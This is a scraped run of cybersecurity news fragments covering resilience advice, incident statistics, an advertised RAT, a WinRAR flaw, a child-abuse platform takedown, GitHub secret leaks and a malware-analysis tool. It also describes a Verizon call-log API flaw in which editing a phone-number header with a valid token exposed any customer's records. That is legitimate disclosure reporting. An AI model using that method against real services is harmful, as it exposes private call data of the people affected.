no longer just a defense mechanism. It’s a driver of resilience, trust, and competitive advantage. When you make that case effectively, the tool you’re championing becomes an investment in the organization’s future, a decision no executive can afford to pass up.\nMore about\nCheck Point\ncompliance\ncybersecurity\ninvestment\nopinion\nresilience\nShare",

        "content": "Mirko Zorz\n, Director of Content, Help Net Security\nApril 3, 2025\nShare\nBuilding a cybersecurity strategy that survives disruption\nCybersecurity isn’t what it used to be. Attackers are moving quicker, disruptions happen all the time, and many security plans built for more predictable times just can’t keep up. With everything from ransomware to geopolitical threats to cloud slip-ups hitting companies, there’s a shift happening: security needs to be ready for chaos, not just focused on keeping things safe.\nThat shift changes everything: how companies plan, how they invest, and how they recover.\nFrom protection to resilience\nCybersecurity used to focus primarily on prevention. But in today’s environment, that’s not enough. That’s where cyber resilience comes in. Instead of just keeping attackers out, it focuses on keeping the business running during and after an attack. It combines security, crisis response, and recovery. It assumes something will go wrong and builds systems to adapt, bounce back quickly, and learn from the damage.\nThe best strategies treat resilience as a\ncore part of business operations\n, not just a security add-on.\n“The key to managing resilience is to approach it like an onion,” says\nJames Morris\n, Chief Executive of The CSBR. “The best strategy is to be effective at managing the perimeter. This approach will allow you to get a level of control on internal and external forces which are key to long-term resilience.”\nThat layered thinking should be matched by clearly defined policies and procedures. “Ensure that your ‘resilience’ strategy and policies are documented in detail,” Morris advises. “This is critical for response planning, but also for any legal issues that may arise. If it’s not documented, it doesn’t happen.”\nDocumentation, however, is only part of the equation. Morris stresses the importance of creating and actively testing a\nresilience plan\nacross the organisation. “Develop and test a resilience management and process plan in your organisation. Ensure that accountabilities are clear and identify information and communication gaps.”\nEnsure that you follow the plan. “It is always tempting to become reactive when under pressure,” Morris notes, “but from an operational and legal point of view it is much better to stick to the plan and not get blown off course in the pressure of the moment.”\nKnow what matters most\nBuilding a strategy that survives disruption starts with knowing what’s critical. That includes core apps, sensitive data, third-party services, and the systems that keep revenue flowing.\nGartner recommends mapping these assets to\nspecific business outcomes\n. What happens to customer trust, operations, or revenue if a system goes offline?\nOrganizations should be modeling complex, real-world scenarios. For example, what happens if a ransomware attack hits during a cloud migration? Or if your supplier is taken offline in a cyberattack? Risk modeling has to go beyond standard threat lists.\nDennis Martin, Crisis Management and Businesses Resilience Specialist at Axians UK, outlines four strategic areas to focus on:\n1. Form a resilience forum and understand critical pain points.\nResilience is a whole-organisation challenge, requiring collaboration among the CISO, CIO, COO, and department heads. Clearly identify business-critical systems and assets (your crown jewels), define realistic recovery time objectives (RTOs), and determine pragmatic workarounds if these objectives cannot be met during a crisis. This ensures alignment of technical capabilities with business priorities, improving motivation and preparedness across all departments.\n2. Strengthen threat detection through automation and orchestration.\nMove beyond traditional monitoring by implementing advanced, behaviour-based anomaly detection and AI-driven solutions to identify novel threats. Invest in automation to enhance the efficiency of detection, triage, and initial response tasks, while orchestration platforms enable coordinated workflows across security and IT tools, significantly boosting response agility.\n3. Establish a structured cyber crisis response team.\nClearly define your cyber crisis team, specifying how it interfaces with IT and strategic crisis management teams. Assign explicit roles and responsibilities, maintain real-time documentation during incidents, and adopt a structured decision-making model such as FORDEC to maintain clarity under pressure.\n4. Prepare proactively for recovery.\nDevelop and regularly test detailed recovery plans. Evaluating different scenarios in advance helps clarify which responses are effective, enabling preparations outside the stress of a crisis. Even seemingly minor preparations—such as setting up an emergency Microsoft tenant or acquiring a 5G Wi-Fi hotspot—can significantly improve your readiness. Investing time in creating thorough, system-specific recovery plans fosters engagement, ensures clarity during emergencies, and highlights additional steps or resources that should be addressed beforehand.\nMake defenses more flexible\nDisruption-ready defenses need to be adaptable. Static, rules-based controls don’t hold up well in crisis.\nZero trust\nis one way forward. It grants access based on identity and behavior, not location. This limits damage when attackers break in.\nAutomation also plays a big role. Fast response depends on automatic isolation, rollback, and detection. When ransomware hits, every second counts.\nIn the cloud, flexibility is even more important. Organizations should embed security early in the development pipeline and using real-time checks for\nmisconfigurations\n.\nDesign for failure\nA good strategy starts with the idea that stuff will break. So you need things like segmentation, backups, and backup plans for your backup plans, along with alternate ways to get back up and running. Fast, reliable recovery is key. Just having backups isn’t enough anymore. They need to be tested regularly and protected, because attackers might try to take them out too when they strike.\nInvolve the whole business\nResilient strategies aren’t just for security teams. They need full executive support and must connect directly to business goals. CISOs are working more closely with leadership to align security with broader risk planning.\nPeople matter as much as tools. Everyone—from IT to legal to comms—needs to know their role during an incident. Organizations should hold regular\ntabletop exercises\nand\nsimulations\nto prepare teams for fast-moving crises.\n“Forging strong partnerships with key stakeholders, including IT teams, executive leadership, and external cybersecurity experts, enhances the effectiveness of cybersecurity strategy. Such collaboration ensures that security measures are integrated seamlessly into business operations and receive buy-in,”\nKory Daniels\n, CISO at Trustwave, told Help Net Security.\nResilience also extends beyond organisational walls. Understanding and managing supply chain vulnerabilities is a vital part of the process. “Work with critical vendors to identify where key points of risk may exist,” Morris says. “Develop joint plans with vendors as part of your crisis management planning process.”\nFinally, none of it works without clear and constant communication. “Focus on communication, communication and communication,” Morris emphasizes. “Openness and transparency are key for managing internal and external stakeholders.”\nPrepare for the next unknown\nDisruption doesn’t always come from an attacker. It could be a supply chain collapse, a natural disaster, or a software failure. Strong strategies account for unknowns, not just known threats.\nThat requires agility. Systems and teams need to respond quickly and shift priorities as needed. Decentralized decision-making and flexible response playbooks are key.\nPost-incident learning also plays a role.\nCISOs\nshould treat each incident as a learning opportunity and update plans accordingly.\n“A cybersecurity strategy is not a one-time initiative, but rather a dynamic process requiring regular review and adaptation,” said Daniels. As cyber threats evolve in both sophistication and scale, organizations must remain agile. That means not only staying ahead of attackers but also rethinking defenses on the fly.\nAccording to Daniels, the role of the CISO reflects this reality. “The work of the CISO is ongoing, requiring constant vigilance, continuous learning, and the ability to quickly pivot strategies in response to emerging risks and technological advancements.” It’s a job defined by its fluidity, where yesterday’s playbook is often obsolete by tomorrow.\nThe bottom line\nCyber disruption isn’t a rare event. It’s something every business should expect. The organizations that will thrive aren’t just the ones with strong defenses. They’re the ones that can adapt fast, recover quickly, and keep the business running even when things go wrong.\nMore about\nCISO\ncyber resilience\ncyber risk\ncybersecurity\nopinion\nrisk management\nstrategy\ntips\nShare",

        "content": "Help Net Security\nApril 3, 2025\nShare\nCybercriminals exfiltrate data in just three days\nIn 56% of Sophos managed detection and response (MDR) and incident response (IR) cases, attackers gained initial access to networks by exploiting external remote services, including edge devices such as firewalls and VPNs, and by leveraging valid accounts.\nCompromised credentials remain the top cause of attacks\nThe combination of external remote services and valid accounts aligns with the top root causes of attacks. For the second year in row, compromised credentials were the number one root cause of attacks (41% of cases). This was followed by exploited\nvulnerabilities\n(21.79%) and brute force attacks (21.07%).\nWhen analyzing MDR  and IR investigations, the Sophos X-Ops team looked specifically at ransomware, data exfiltration, and data extortion cases to identify how fast attackers progressed through the stages of an attack within an organization. In those three types of cases, the median time between the start of an attack and exfiltration was only 72.98 hours (3.04 days). Furthermore, there was only a median of 2.7 hours from exfiltration to attack detection.\nThe lack of visibility for files moving around the network – and of missing logs – also contributes to exfiltration statistics. In 2024, analysts were able to confirm that\nexfiltration\noccurred in 27% of cases. Including evidence of data staging and possible exfiltration, this rises to 36%. Ransomware victims had their data exfiltrated in 43% of the incidents investigated. An additional 14% had possible exfiltration or evidence of data staging.\n“Passive security is no longer enough. While prevention is essential, rapid response is critical. Organizations must actively monitor networks and act swiftly against observed telemetry. Coordinated attacks by motivated adversaries require a coordinated defense. For many organizations, that means combining business-specific knowledge with expert-led detection and response,” said\nJohn Shier\n, field CISO.\nRansomware deployments spike outside business hours\nThe median time between attackers’ initial action and their first (often successful) attempt to breach\nActive Directory\n(AD) – arguably one of the most important assets in any Windows network – was just 11 hours. If successful, attackers can more easily take control of the organization. 62% of the compromised servers were running operating systems that were out of mainstream support.\nIn 2024, 83% of\nransomware\nbinaries were deployed outside the target’s local business hours; the all-time statistic stands at 88%. While it appears that ransomware deployments only come out at night, there does not however seem to be any lingering preference in days of the week.\nAkira was the most frequently encountered ransomware group in 2024, followed by Fog and\nLockBit\n(despite a multi-government takedown of LockBit earlier in the year).\nOverall,\ndwell time\n– the time from the start of an attack to when it is detected – decreased from 4 days to just 2 in 2024, largely due to the addition of MDR cases to the dataset.\nDwell time in IR cases remained stable at 4 days for ransomware attacks and 11.5 days for non-ransomware cases. Dwell time in MDR cases was only 3 days for ransomware cases and just 1 day for non-ransomware cases, suggesting MDR teams are able to more quickly detect and respond to attacks.\nLack of MFA is putting organizations at risk\nRemote desktop protocol (RDP) detections continue to top the chart of abused Microsoft tools. In 2024, it was used by attackers in 84% of cases, with 67% being used only for internal lateral movement and 3% being used only externally.\nIn 2022, researchers observed 22% of victims did not have\nMFA\nconfigured. That proportion nearly tripled to 63% in 2024. This is one area where there was no meaningful distinction between IR and MDR cases.\nMFA was unavailable in 66% of IR cases and 62% of MDR cases. This highlights one way in which even the most capable detection and response program can still leave organizations vulnerable to attack.\nSecurity practitioners are not only fighting the battle against the threats posed by external adversaries, but an internal struggle with business processes and change management.\nMore about\ncybercrime\ncybersecurity\nransomware\nreport\nSophos\nsurvey\nShare",

However, compared to the same period last year, the overall malware count more than doubled.\nKey findings from the Open Source Malware Index, Q1 2025 include:\nData exfiltration malware dominates:\n56% of the malware discovered in Q1 2025 was related to\ndata exfiltration\n, designed to harvest sensitive information from infected systems, a dramatic increase from 26% in Q4 2024. This rise highlights the growing concern of sensitive information being compromised via malicious open source components.\nCrypto miners remain steady:\nCrypto-mining malware made up 7% of malicious packages discovered in Q1 2025, doubling from 3.5% in Q4 2024, showing that resource-hijacking attacks are still prevalent in open source ecosystems.\nFinancial services and government institutions defending attacks:\nSonatype helped block more than 20,000 open source malware attacks in Q1 2025 — 66% at financial services companies, 14% at government organisations, and 7% in the utilities, oil & gas sector.\nOpen source malware ‘noise’ decreasing:\n80% of logged packages in Q1 2025 were made up of more sophisticated and threatening types of\nmalware\n, such as droppers and code injection malware.\n“The data shows a meaningful change in how ecosystem maintainers are taking action against harmful components, but it also reflects the growing sophistication of threat actors,” said\nBrian Fox\n, CTO of Sonatype. “We have seen a rise in more sophisticated types of open source malware, showing that attackers are innovating in ways that demand ongoing vigilance. You have to block it before it enters the development environment — if open source malware is in your repository, it’s already too late.”\nMust read:\nGitHub CISO on security strategy and collaborating with the open-source community\nDon’t let these open-source cybersecurity tools slip under your radar\n33 open-source cybersecurity solutions you didn’t know you needed\nMore about\ncybercrime\nData exfiltration\nmalware\nopen source\nreport\nSonatype\nShare",

It appears to have been specifically developed for corporate espionage and targeted attacks on business environments. </p>\n\n\n\n<p>The malware advertisement, discovered on Thursday, April 3, 2025, describes sophisticated capabilities that could threaten organizations worldwide.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Malware Capabilities and Features</strong></h2>\n\n\n\n<p>According to a ThreatMon post shared on X, the advertisement claims that SnowDog RAT offers an extensive array of intrusion and persistence features that make it particularly dangerous. </p>\n\n\n\n<p>The malware reportedly includes a web-based <a href=\"https://cybersecuritynews.com/command-and-controlc2-server/\" rel=\"noreferrer noopener\" target=\"_blank\">command and control (C2) interface</a> that allows attackers to remotely manage infected systems.&nbsp;</p>\n\n\n\n<p>This includes functionality for creating both the RAT payload and various delivery methods, such as HTML-to-DOCM and ISO file conversion techniques.</p>\n\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://lh7-rt.googleusercontent.com/docsz/AD_4nXfDDMzjnA2jvrBVt1ilrXgEhsc6MEEeNtK4t24xtLDCBQXClyhpSaD9NjK1odZ-hDVov20iSr1VfqhAkZ_YKA1mvxmoW8v7ewXjhZn3r_UNV72CCJgXrVRufhk-FElcRI_WOr5J?key=ZO8H3bfoWZwINYnj2KGwhjkQ\" /></figure>\n\n\n\n<p>The RAT allegedly enables attackers to download files and directories from compromised machines functionally with a single click. </p>\n\n\n\n<p>Additionally, it can execute files directly from memory within system processes, a &#8220;living off the land&#8221; technique that helps evade detection by traditional security solutions.</p>\n\n\n\n<p>This type of malware represents a significant evolution in commercially available RATs. The ability to cryptographically protect each assembly at creation time with a proprietary algorithm makes it particularly challenging to detect using signature-based methods.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Technical Specifications and Delivery</strong></h2>\n\n\n\n<p>Security analysis of the advertisement reveals the malware utilizes advanced techniques similar to those seen in state-sponsored attacks.&nbsp;</p>\n\n\n\n<p>SnowDog RAT reportedly creates unique fly assemblies for each target, implements transport connectors for communication, and leverages TOR networks for bot control to obfuscate command traffic.</p>\n\n\n\n<p>The malware appears designed to establish persistence by starting from trusted process memory and opening web console connections with remote machines using administrator rights.&nbsp;</p>\n\n\n\n<p>This grants the attacker full PowerShell command execution capabilities, allowing for lateral movement within compromised networks.</p>\n\n\n\n<p>Remote Access Trojans like SnowDog represent a hazardous category of malware. Once installed, RATs typically run silently in the background without appearing in active programs or task lists, maintaining an ongoing communication channel with command and control servers.</p>\n\n\n\n<p>The advertisement mentions targeted attacks on corporations, indicating the tool is being marketed for potential corporate espionage or ransomware deployment.</p>\n\n\n\n<p>Similar RATs have been used in sophisticated attacks to steal sensitive information, capture keystrokes, activate webcams, take screenshots, and even download additional malicious payloads.</p>\n\n\n\n<p>Security experts recommend organizations implement robust email filtering, keep systems updated with security patches, utilize behavior-based <a href=\"https://cybersecuritynews.com/endpoint-protection-platform/\" rel=\"noreferrer noopener\" target=\"_blank\">endpoint protection</a>, and maintain comprehensive network monitoring to detect unusual data transfers or communication patterns that might indicate RAT activity.</p>\n\n\n\n<p>User awareness training remains critical, as RATs are typically delivered through social engineering tactics like phishing emails.&nbsp;</p>\n\n\n\n<p>Organizations should also implement application allowlisting and network segmentation to limit the potential damage if a system becomes compromised.</p>\n\n\n\n<p class=\"has-text-align-center has-background\"><strong><code><strong><code>Investigate Real-World Malicious Links &amp; Phishing Attacks With <strong>Threat Intelligence Lookup</strong> - <a href=\"https://intelligence.any.run/plans?utm_source=csn&amp;utm_medium=article&amp;utm_campaign=3-techniques-to-improve-th&amp;utm_content=plans&amp;utm_term=010425\" rel=\"noreferrer noopener nofollow\" target=\"_blank\">Try 50 Request for Free</a></code></strong></code></strong></p>\n<p>The post <a href=\"https://cybersecuritynews.com/threat-actors-allegedly-selling-snowdog-rat-malware/\">Threat Actors Allegedly Selling SnowDog RAT Malware With Control Panel on Hacker Forums</a> appeared first on <a href=\"https://cybersecuritynews.com\">Cyber Security News</a>.</p>",

They also develop strategies to increase a company&#8217;s security defenses by continuously monitoring its security posture. </p>\n\n\n\n<p>As part of the blue team, you will automate secure systems, manage incidents, and acquire threat intelligence.</p>\n\n\n\n<p>IT security experts utilize blue team tools to protect against simulated <a href=\"https://cybersecuritynews.com/securing-e-commerce-best-practices-for-protecting-online-retailer-portals/\" rel=\"noreferrer noopener\" target=\"_blank\">cyber threats</a> launched by the &#8220;red team&#8221; to improve cybersecurity and penetration testing procedures. </p>\n\n\n\n<p><strong>In cybersecurity and penetration testing simulations, the phrases &#8220;red team&#8221; and &#8220;blue team&#8221; are used, with &#8220;red team&#8221; representing &#8220;attackers&#8221; and &#8220;blue team&#8221; representing &#8220;defenders.&#8221;</strong></p>\n\n\n\n<p>Blue team tools are software applications IT security experts employ to defend against a simulated cyberattack. Simulation of an attack and a defense is an excellent technique for enhancing cybersecurity and intrusion protection.</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"h-skills-of-a-blue-team\"><strong>Skills Of A Blue Team</strong></h2>\n\n\n\n<p>Although their technical focus is defense, the blue team actively participates in prevention. This team identifies and mitigates risks and threats before they damage the company. </p>\n\n\n\n<p>Even the most skilled cybersecurity professionals struggle to keep up with the growing intelligence of <a href=\"https://cybersecuritynews.com/cyberattacks-venture-capital-crm-defenses/\" rel=\"noreferrer noopener\" target=\"_blank\">cyberattacks</a> and attackers. The blue team is in charge of observation, protection, and recovery. A member of the blue team should have the following abilities:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>Risk assessment:</strong> A risk assessment enables identifying and allocating protective resources for at-risk valuable pieces.</li>\n\n\n\n<li><strong>Strengthening techniques:</strong> To enhance the organization&#8217;s security, a blue team must understand how to address <a href=\"https://cybersecuritynews.com/cyber-security-news-weekly-round-up-july/\" rel=\"noreferrer noopener\" target=\"_blank\">vulnerabilities</a>.</li>\n\n\n\n<li><strong>Threat defense necessitates knowledge:</strong> Blue teams must anticipate an attacker&#8217;s approach.</li>\n\n\n\n<li><strong>Detection and monitoring systems:</strong> As a member of the blue team, I must be familiar with packet sniffer devices, <a href=\"https://cybersecuritynews.com/logrhythm-and-exabeam-to-merge/\" rel=\"noreferrer noopener\" target=\"_blank\">SIEM</a> systems, IDS, and IPS.</li>\n\n\n\n<li><strong>Technical hardening skills:</strong> Professional hardening skills must be entirely prepared for any attacker or intrusion, and all systems must be hardened to decrease the exploit&#8217;s attack surface. Hardening includes blocking DNS attacks and reducing their attack surface, among other measures.</li>\n\n\n\n<li><strong>Familiarity with SIEM: </strong>Security information and event management (SIEM) is a subset of information security that combines security information management (SIM) with security event management (SEM) in software products and services (SEM). A red team examines security alarms produced by network and application hardware in real-time.</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"h-what-does-a-blue-team-do\"><strong>What Does A Blue Team Do?</strong></h2>\n\n\n\n<p>Blue teams establish security precautions around an organization&#8217;s most valuable assets. Therefore, after collecting data and recording what must be defended, the blue team performs a risk assessment by discovering risks and vulnerabilities that these vulnerabilities can exploit. </p>\n\n\n\n<p>Teams in blue conduct risk evaluations. They evaluate fundamental capacities, determine how their elimination will affect the organization, and document the significance of these resources. </p>\n\n\n\n<p>Then, professionals are instructed on security measures, and more stringent password regulations are created to restrict system access. Typically, a monitoring tool is implemented to log and analyze system access. </p>\n\n\n\n<p><strong>Blue teams will perform DNS audits, scan internal and external systems for weaknesses, and collect network traffic samples as part of routine maintenance</strong>. Here are some tasks that a blue team does.</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>Monitoring domain name servers (DNS) for phishing attacks, stale DNS vulnerabilities, DNS record deletion unavailability, and decreasing DNS and online attacks.</li>\n\n\n\n<li>We use digital footprint analysis to follow users&#8217; actions and detect known security vulnerabilities.</li>\n\n\n\n<li>Computers, iPads, and smartphones can be kept safe by installing endpoint security software, keeping antivirus software up to date, and correctly setting up the firewall access controls.</li>\n\n\n\n<li>SIEM systems are used to log and ingest network traffic.</li>\n\n\n\n<li>They identify an attacker&#8217;s activities by examining logs and memory, recognize and pinpoint an attack using these logs, and configure networks correctly by separating them.</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"h-here-are-our-picks-for-the-10-best-blue-team-tools-and-its-features\"><strong>Here Are Our Picks For The 10 Best Blue Team Tools</strong>:</h2>\n\n\n\n<ol class=\"wp-block-list\">\n<li><strong><strong>Wazuh</strong> – <strong>SIEM &amp;

This allows threat actors to execute malicious code without triggering Windows’ standard security alerts.</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>Privilege Requirements</strong>: Creating symbolic links typically requires administrator privileges in default Windows configurations, limiting immediate widespread exploitation. However, compromised admin accounts or systems with relaxed permissions remain at risk.</li>\n\n\n\n<li><strong>Attack Vector</strong>: Users must open a malicious archive or visit a compromised webpage hosting the weaponized file. Successful exploitation grants attackers control over the victim’s system in the context of the logged-in user.</li>\n\n\n\n<li><strong>Malware Delivery</strong>: While no active exploits have been confirmed, similar vulnerabilities (e.g., CVE-2023-38831 in 2023) were weaponized to deploy malware like DarkMe and Agent Tesla.</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Affected Software</strong></h2>\n\n\n\n<p>WinRAR versions prior to 7.11 have a flaw that RARLAB, the developer, has fixed in the latest update.

Key features include:\nWeb-Based Control Panel\n: Allows hackers to manage compromised devices from any browser, with real-time monitoring of infected systems.\nMultiple Distribution Vectors\n: Phishing emails, malicious ads, fake software downloads, and exploit kits to breach targets.\nStealth Execution\n: Code obfuscation and anti-analysis techniques to evade endpoint security tools.\nCryptographic Protection\n: Data encryption for command-and-control (C2) communications, masking malicious traffic as legitimate HTTPS traffic.\nA listing reviewed by cybersecurity analysts indicates the RAT can log keystrokes, hijack webcams, extract credentials, and deploy secondary payloads like\nransomware\n.\nThe seller has priced the malware at an undisclosed amount, offering “lifetime access” and customer support to buyers.\nSnowDog’s features suggest a focus on high-value targets, including technology firms, financial institutions, and healthcare organizations.\n“This isn’t a script kiddie tool—it’s designed for persistent, long-term espionage,” said Mira Patel, a threat intelligence analyst at SecuRight.\n“The encryption and stealth mechanisms make it particularly dangerous for enterprises lacking advanced threat detection.”\nRecent months have seen a surge in RAT-based attacks, with a 2025 IBM report noting a 34% year-over-year increase in corporate cyber-espionage incidents.\nSnowDog’s emergence aligns with growing demand for “as-a-service” malware, lowering the barrier for less skilled criminals to launch complex attacks.\nMitigation Strategies for Organizations\nTo counter such threats, experts recommend:\nEmployee Training\n: Regular phishing simulations to reduce click-through rates on malicious links.\nNetwork Segmentation\n: Isolate critical systems to limit lateral movement during breaches.\nMulti-Factor Authentication (MFA)\n: Prevent credential theft from granting full network access.\nEndpoint Detection and Response (EDR)\n: Deploy tools to flag unusual activities, such as unexpected data transfers or registry changes.\n“Real-time monitoring and zero-trust frameworks are essential to detect RATs like SnowDog,” advised Carlos Mendez of CyberDefense Solutions. “Assume breaches\nwill\nhappen and focus on rapid containment.”\nInterpol’s Cybercrime Division has flagged SnowDog-related forums for takedown while cybersecurity firms analyze samples to develop detection signatures. However, the malware’s modular design complicates\nreverse-engineering\nefforts.\nAuthorities urge organizations to report suspicious activity, noting that RATs often lie dormant for weeks before activating.\n“The longer a RAT remains undetected, the more damage it can inflict,” warned INTERPOL’s Elena Rivera.\nAs cybercriminals monetize advanced tools, enterprises must prioritize proactive defense measures.

Users paid for access using cryptocurrencies, earning tokens by contributing to the platform’s operations.\nUnlike other dark web platforms, Kidflix prioritized streaming functionality, making its content more accessible to offenders. Notably, the platform also allowed video previews with varying quality tiers, further monetizing child abuse content.\nUnprecedented Results\nThe server hosting Kidflix was seized on March 11, 2025, in a joint effort by German and Dutch authorities. To date, the investigation has resulted in:\n1,393 suspects identified\nworldwide,\n79 arrests\n, including individuals who committed direct abuse,\n3,000 electronic devices seized\n, and\n39 children protected\n.\nEuropol has called this the largest child sexual exploitation operation in its history.\nA Global Effort\nThe successful takedown of Kidflix was made possible through international collaboration and advanced cybercrime expertise.\nEuropol’s European Cybercrime Centre (EC3) played a pivotal role by analyzing vast amounts of video evidence and coordinating\ndata sharing\namong nations.\nEuropol experts uncovered key leads that guided enforcement agencies to suspects and linked crimes across borders.\nBavarian authorities spearheaded action weeks from March 10–23, 2025. During this period, coordinated raids and arrests were made while new evidence surfaced.\nDespite the platform’s closure, authorities emphasized the ongoing investigation, suggesting that more arrests and rescues are expected in the coming months.\nKidflix’s creator allegedly amassed significant illicit profits by exploiting children, further fueling the urgency behind the operation.\nWhile the platform’s closure marks an important victory, law enforcement officials and child protection advocates stress that much work remains to eradicate this heinous crime.\nInternational collaboration will continue to be a cornerstone in the fight against child sexual exploitation.\nEuropol’s Executive Director commended the effort, underscoring that protecting society’s most vulnerable is a collective responsibility: “This mission proves that together, we can dismantle even the most insidious criminal networks. The responsibility to protect children transcends borders.”\nWith ongoing investigations and global resolve, authorities are hopeful this landmark takedown will serve as a warning to offenders and a step toward justice for victims.\nFind this News Interesting!

Unfortunately, developers often expose these secrets accidentally when committing code, sharing repositories, or during collaborative development.\nEven seemingly benign leaks can provide attackers with a foothold into larger systems. A single compromised\nAPI\nkey often leads to lateral attacks across an organization, risking critical infrastructure and data.\nFurther complicating the issue, GitHub noted that accidental misconfigurations, such as making private repositories public, surged to record highs in 2024.\nGitHub’s Enhanced Security Push\nIn response to escalating security challenges, GitHub has ramped up its efforts to mitigate secret leaks across its platform. Among its noteworthy initiatives:\nPush Protection by Default\n: To prevent exposed secrets before they occur, GitHub now automatically scans public repositories for sensitive information. This feature is built into its platform and effectively blocks secret-leak attempts in real time.\nPartnership Program with Token Issuers\n: GitHub collaborates with major providers like AWS, Google Cloud, and\nOpenAI\nto detect leaked secrets swiftly. If detected, these partners can quarantine or revoke compromised tokens immediately.\nStandalone Security Enhancements\n: GitHub has made its security tools, such as Secret Protection and Code Security, available as standalone products. Previously bundled under premium plans, this move aims to democratize access to security features for smaller teams and organizations.\nA Path Forward for Developers\nThe incident serves as a wake-up call for organizations and developers to prioritize secure secret management. Experts suggest adopting best practices, including:\nAutomation\n: Minimize human interaction with secrets by automating their creation, rotation, and revocation.\nRegular Scanning\n: Use continuous monitoring solutions, such as GitHub’s built-in secret scanning tools, to address leaks before exploitation occurs.\nLeast Privilege Principle\n: Limit access to secrets only to users and apps that require them.\nWhile GitHub’s efforts to bolster its security infrastructure are commendable, the responsibility to protect secrets ultimately lies with developers and organizations.\nWith cyberattacks increasingly exploiting exposed credentials, proactive measures are no longer optional—they’re a necessity. For developers, staying informed and adopting secure practices will remain critical to combating future threats.\nGitHub’s recent advancements in security underscore the gravity of the issue and the need for collaborative solutions to safeguard the global software development ecosystem.\nFind this News Interesting!

This difficulty is compounded when obfuscation tools like Garble are used to obscure function and package names.\nGarble’s obfuscation properties strip symbol tables and randomize names, making manual static analysis tedious and time-consuming.\nGarble Obfuscation Properties Analysis\nVolexity’s\ninvestigations\nfrequently encounter Golang malware, prompting the need for advanced solutions to address the challenges posed by such obfuscators. GoResolver was developed in response to this need.\nIntroducing GoResolver\nGoResolver is a groundbreaking open-source tool that leverages control-flow graph similarity techniques to resolve obfuscated function names.\nBy analyzing the paths a binary takes during execution, GoResolver can identify similarities between control-flow graphs of obfuscated and clean binaries, restoring symbol information that would otherwise be lost.\nThis approach significantly enhances the ability to reverse engineer malware samples.\nKey features of GoResolver include:\nSymbol Recovery\n: Retrieves obfuscated function and package names.\nControl-Flow Graph Analysis\n: Identifies graph similarities to recover original symbol information.\nIntegration with Popular Tools\n: Provides plugins for\nIDA Pro\nand\nGhidra\nto streamline workflows.\nOpen-Source Accessibility\n: Available for download on GitHub, encouraging collaboration and continuous improvement.\nTackling Garble Obfuscation\nGarble is a widely used Golang obfuscator that presents unique challenges. While it strips symbol tables and randomizes names, the obfuscation reveals patterns that GoResolver can exploit.\nFor example, Garble’s randomized names must remain consistent within a package, enabling analysts to infer package identities.\nUsing this logic, GoResolver improves symbol recovery by associating functions with their respective packages.\nAdditionally, GoResolver bypasses obfuscation limitations by fingerprinting Golang runtime versions.\nBy testing similarities among runtime fragments, GoResolver efficiently identifies the exact Golang version used to compile the malware, enabling accurate binary analysis.\nVolexity demonstrated GoResolver’s capabilities by analyzing a Garble-obfuscated Stowaway agent. Initially, disassembled binaries contained generic names, complicating analysis.\nWhen submitted to GoResolver, the tool identified the\nGolang\nversion through runtime fingerprinting and resolved obfuscated symbols.\nUsing control-flow graph similarity, GoResolver restored meaningful function names and package associations, allowing analysts to focus on the malware’s core logic rather than runtime and library methods.\nIntegration with IDA Pro and Ghidra\nTo expedite workflows, GoResolver offers plugins for IDA Pro and Ghidra, two of the most widely used reverse-engineering platforms.\nSRE Plugins\nAnalysts can choose between analyzing samples directly within the tools or importing pre-generated symbol reports. These plugins enhance efficiency, ensuring seamless integration into malware analysis operations.\nWhen using Ghidra, the following dialogs are shown\nGoResolver is a pioneering tool that addresses the growing challenge of reverse-engineering obfuscated Golang malware.\nBy combining symbol extraction techniques with control-flow graph analysis, GoResolver offers unparalleled capabilities for retrieving lost symbol information and understanding binary layouts.\nIt empowers cybersecurity analysts to focus on core\nmalware\nfunctionality, improving the efficiency of forensic investigations.\nVolexity plans to expand GoResolver’s capabilities, including features like automatic Golang string parsing and enhanced binary analysis.\nThe tool is available for download on GitHub, and the repository will continue to be updated with new features and enhancements.\nFor cybersecurity professionals tackling Golang malware, GoResolver is a must-have in their arsenal, ensuring deeper insights and faster analysis to combat emerging threats effectively.\nFind this News Interesting!

However, a researcher recently found the app vulnerable to a serious security lapse.\nAt the core of this issue was the app’s interaction with Verizon’s servers to fetch call history data. A network request sent to the endpoint /clr/callLogRetrieval facilitated this retrieval.\nA critical flaw lay in how the app failed to validate that the phone number being queried matched the phone number tied to the signed-in user.\nBy modifying the phone number in the request header (X-Ceq-MDN) while keeping a valid authorization token (JWT), an attacker could fetch call log data for any Verizon customer.\nThe JWT payload looked like this:\n{\n\n    \"sub\": \"SIGNED_IN_USER_PHONE_NUMBER_HERE\",\n\n    \"iat\": \"1740253712\",\n\n    \"iss\": \"df88f1ed1dfd9a903e4c8dca7f00089e134c6c4e0a566cd565147ba1dadf78a6\",\n\n    \"secret\": \"REDACTED\",\n\n    \"alg\": \"ECDSA-256\",\n\n    \"exp\": \"1740255512\"\n\n}\nWhy This Matters\nCall logs might seem inconsequential, but they are far more revealing than they appear.\nMetadata such as timestamps and call durations can paint a picture of an individual’s daily routine, personal relationships, and confidential contacts.\nExample Vulnerable Request\nFor high-risk individuals like journalists, law enforcement officers, politicians, or domestic abuse survivors, such information falling into the wrong hands could have catastrophic consequences.\nThe breach impacts Verizon’s extensive customer base—possibly extending to all subscribers, as the Call Filter service is believed to be enabled by default.\nThe\nfindings\nsuggest that the vulnerability was not restricted to specific accounts or user groups.\nThe server hosting the vulnerable API appears to be owned by Cequint, a telecom technology company specializing in caller ID services.\nThis raises further questions about the security of customer data stored or managed by third-party contractors like Cequint, especially when such data is tied to one of the largest mobile carriers in the U.S.\nWhile technical details of this\nvulnerability\nare now public, its discovery is a stark reminder of the need for vigilance in protecting digital identities.\nWhether through stricter validations, internal audits, or addressing the role of third-party security lapses, it’s clear that carriers like Verizon must double down on keeping customer data safe.\nFind this News Interesting!

